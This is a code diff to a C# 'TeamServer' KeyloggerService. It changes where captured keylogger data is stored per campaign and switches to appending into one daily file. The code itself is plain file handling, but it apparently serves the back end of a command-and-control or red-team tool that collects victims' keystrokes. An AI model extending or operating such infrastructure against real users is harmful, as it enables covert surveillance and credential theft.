@@ -6,11 +6,12 @@ namespace TeamServer.Services;
 
 public sealed class KeyloggerService : IKeyloggerService
 {
-    private readonly string _dataDirectory;
-    public KeyloggerService(IWebHostEnvironment environment)
+    private readonly string _filesDirectory;
+    public KeyloggerService(IConfiguration configuration, IWebHostEnvironment environment)
     {
-        _dataDirectory = Path.Combine(environment.ContentRootPath, "data");
-        Directory.CreateDirectory(_dataDirectory);
+        var root = Path.GetFullPath(configuration["StoragePath"] ?? Path.Combine(environment.ContentRootPath, "storage"));
+        _filesDirectory = Path.Combine(root, "files");
+        Directory.CreateDirectory(_filesDirectory);
     }
 
     public async Task<Result<string>> SaveDataAsync(int campaignId, string data)
@@ -20,12 +21,12 @@ public sealed class KeyloggerService : IKeyloggerService
             return FileError.EmptyFile();
         }
 
-        var campaignDirectory = Path.Combine(_dataDirectory, campaignId.ToString());
+        var campaignDirectory = Path.Combine(_filesDirectory, campaignId.ToString());
         Directory.CreateDirectory(campaignDirectory);
-        var fileName = $"keylogger_data_{DateTime.UtcNow:yyyyMMdd_HHmmss_fff}_{Guid.NewGuid():N}.txt";
+        var fileName = $"keylogger_data_{DateTime.UtcNow:yyyyMMdd}.txt";
         var filePath = Path.Combine(campaignDirectory, fileName);
 
-        await File.WriteAllTextAsync(filePath, data);
+        await File.AppendAllTextAsync(filePath, data);
         return fileName;
     }
 
@@ -37,7 +38,7 @@ public sealed class KeyloggerService : IKeyloggerService
             return FileError.FileNotFound(fileName);
         }
 
-        var filePath = Path.Combine(_dataDirectory, campaignId.ToString(), safeFileName);
+        var filePath = Path.Combine(_filesDirectory, campaignId.ToString(), safeFileName);
         if (!File.Exists(filePath))
         {
             return FileError.FileNotFound(safeFileName);
